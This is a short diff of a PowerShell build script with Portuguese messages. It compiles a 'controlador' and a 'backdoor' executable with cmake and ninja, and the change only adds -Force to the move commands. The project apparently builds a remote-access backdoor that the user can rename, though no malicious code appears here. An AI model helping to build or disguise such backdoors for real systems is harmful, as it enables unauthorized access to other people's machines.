@@ -27,7 +27,7 @@ Remove-Item * -Force -Recurse
 gci -recurse -filter "vcvars64.bat" -Path "${discoLocal}:\" | foreach-object {
 $place_path = $_.directory}
 CMD /C """$place_path\vcvars64.bat"" && cmake -G Ninja .. && ninja"
-mv controlador.exe ../resultado/controlador.exe 
+mv controlador.exe ../resultado/controlador.exe -Force 
 cd ..
 echo "Seu controlador esta na pasta resultado"
 
@@ -60,7 +60,7 @@ Remove-Item * -Force -Recurse
 gci -recurse -filter "vcvars64.bat" -Path "${discoLocal}:\" | foreach-object {
 $place_path = $_.directory}
 CMD /C """$place_path\vcvars64.bat"" && cmake -G Ninja .. && ninja"
-mv backdoor.exe ../resultado/$nomeBackdoor.exe 
+mv backdoor.exe ../resultado/$nomeBackdoor.exe -Force
 cd ..
 echo "Sua Backdoor esta na pasta resultado"
 
